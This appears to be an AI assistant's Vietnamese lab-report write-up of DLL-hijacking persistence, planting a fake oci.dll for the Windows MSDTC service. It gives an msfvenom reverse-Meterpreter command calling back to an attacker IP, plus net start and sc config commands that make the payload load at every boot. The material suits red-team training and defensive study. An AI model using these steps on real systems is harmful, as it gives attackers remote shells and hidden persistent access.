Dưới đây là **bản report tiếng Việt**, viết lại cho **mạch lạc – đúng văn phong technical report / lab report**, giữ nguyên ý kỹ thuật bạn đưa ra.

---

## Persistence Using DLL Hijacking

### Tổng quan

DLL Hijacking là một kỹ thuật persistence lợi dụng cơ chế Windows tìm kiếm và tải các thư viện động (Dynamic Link Library – DLL). Bằng cách chèn một DLL độc hại vào đường dẫn tìm kiếm của một ứng dụng hoặc service, attacker có thể khiến chương trình tải DLL độc hại thay vì DLL hợp lệ. Từ đó, attacker có thể can thiệp và kiểm soát luồng thực thi của chương trình theo hướng malicious.

Khi một chương trình Windows khởi động, nó sẽ tải nhiều DLL vào không gian bộ nhớ của tiến trình. Windows tìm các DLL cần thiết theo một thứ tự tìm kiếm cố định (DLL Search Order). Nếu một DLL được yêu cầu nhưng không tồn tại trong các thư mục hệ thống mặc định, Windows có thể tải một DLL cùng tên từ thư mục khác nằm sớm hơn trong search order. Việc khai thác hành vi này có thể được sử dụng trong các kịch bản red teaming để duy trì quyền truy cập (persistence) một cách tương đối stealthy.

Trong kỹ thuật persistence này, attacker giả mạo một DLL bị thiếu của một tiến trình Windows nhằm thực thi mã tùy ý và ẩn mình trong hoạt động bình thường của hệ thống. Bề mặt tấn công của DLL hijacking là rất lớn và phụ thuộc vào phiên bản hệ điều hành cũng như các phần mềm được cài đặt. Phần dưới đây mô tả một ví dụ thực tế có thể áp dụng trên Windows 7 và Windows 10.

---

### Mục tiêu: MSDTC Service

**Microsoft Distributed Transaction Coordinator (MSDTC)** là một dịch vụ Windows chịu trách nhiệm điều phối các giao dịch giữa nhiều thành phần khác nhau như cơ sở dữ liệu (ví dụ: SQL Server) và web server.

Khi dịch vụ MSDTC khởi động, nó sẽ cố gắng tải một số DLL từ thư mục `System32`. Các DLL phụ thuộc này cũng có thể được quan sát thông qua Windows Registry.

Trong cài đặt Windows thông thường, file **`oci.dll`** không tồn tại trong thư mục `%SystemRoot%\System32`. Việc thiếu DLL này tạo ra cơ hội cho kỹ thuật DLL hijacking. Nếu attacker đặt một DLL độc hại có cùng tên (`oci.dll`) vào thư mục này (yêu cầu quyền administrator), MSDTC sẽ tải và thực thi DLL đó khi service được khởi động.

---

### Tạo payload DLL

Một DLL độc hại có thể được tạo bằng công cụ `msfvenom` của Metasploit hoặc bất kỳ framework C2 nào khác. Trong ví dụ này, payload reverse Meterpreter được sử dụng.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=1234 -f dll > oci.dll
```

Sau khi tạo xong, file `oci.dll` được upload vào thư mục:

```
%SystemRoot%\System32\
```

---

### Kích hoạt thực thi

Sau khi DLL độc hại được đặt vào đúng vị trí, dịch vụ MSDTC được khởi động:

```
net start msdtc
```

Khi service chạy, nó sẽ tải `oci.dll` độc hại, dẫn đến việc payload được thực thi. Điều này có thể được xác nhận bằng công cụ **Process Explorer**, nơi có thể quan sát thấy DLL độc hại được load vào tiến trình `msdtc.exe`.

Tại thời điểm này, attacker nhận được shell thông qua kết nối reverse.

---

### Thiết lập Persistence

Để duy trì quyền truy cập sau khi hệ thống reboot, dịch vụ MSDTC có thể được cấu hình để tự động khởi động cùng hệ thống.

Kiểm tra cấu hình hiện tại của service:

```
sc qc msdtc
```

Cấu hình service khởi động tự động:

```
sc config msdtc start= auto
```

Với cấu hình này, mỗi lần hệ thống khởi động, dịch vụ MSDTC sẽ chạy và tự động load DLL độc hại, từ đó đảm bảo persistence.

---

### Kết luận

DLL hijacking là một kỹ thuật persistence hiệu quả khi attacker có thể lợi dụng các DLL phụ thuộc bị thiếu trong các dịch vụ Windows đáng tin cậy. Bằng cách khai thác MSDTC và một DLL không tồn tại mặc định như `oci.dll`, attacker có thể đạt được thực thi mã và persistence ổn định với rất ít tương tác từ người dùng. Kỹ thuật này cho thấy tầm quan trọng của việc hardening service, kiểm soát DLL search order và giám sát các thay đổi bất thường trong các thư mục hệ thống quan trọng.

---

Nếu bạn muốn, mình có thể:

* Viết thêm **Detection & Mitigation** (blue team / defender view)
* Rút gọn lại cho **câu trả lời lý thuyết / trắc nghiệm**
* Chỉnh lại theo format **OSCP / CRTO / lab report**

Cứ nói yêu cầu 👍
